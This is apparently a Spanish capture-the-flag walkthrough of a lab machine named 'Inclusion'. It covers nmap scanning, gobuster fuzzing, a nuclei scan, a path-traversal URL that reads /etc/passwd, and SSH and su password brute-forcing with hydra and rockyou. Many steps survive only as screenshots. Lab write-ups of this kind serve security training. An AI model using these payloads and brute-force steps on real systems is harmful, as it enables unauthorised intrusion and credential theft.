# Máquina Inclusion

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

![alt text](image-2.png)

hice fuzzing web a /shop y no encontré nada.

entramos en la web:

![alt text](image-3.png)

Al ver esto: "Error de Sistema: ($_GET['archivo']"); deduje que puede ser un LFI:

ya que en el directorio /shop no se encontró ningún archivo php, probé con nuclei para ver si era vulnerable a LFI:

nuclei -u 'http://172.17.0.2/shop/?archivo' -tags lfi --dast

![alt text](image-4.png)

en la web:

http://172.17.0.2/shop/?archivo=../../../../../../../../../../etc/passwd

![alt text](image-5.png)

encontré 2 usuario manchis y seller

ataque con hydra:

los dos usuarios, manchi y seller los puse en un archivo llamado user y ejecuté:

![alt text](image-8.png)

### Intrusión

me conecté por ssh:


transferí la herramienta Linux-Su-Force.sh y el rockyou para hacer un ataque de fuerza bruta y encontrar la contraseña del usuario seller.

![alt text](image-6.png)

![alt text](image-7.png)

ejecución:

![alt text](image-9.png)

![alt text](image-10.png)

### Escalar privilegios

siendo el usuario seller:

![alt text](image-11.png)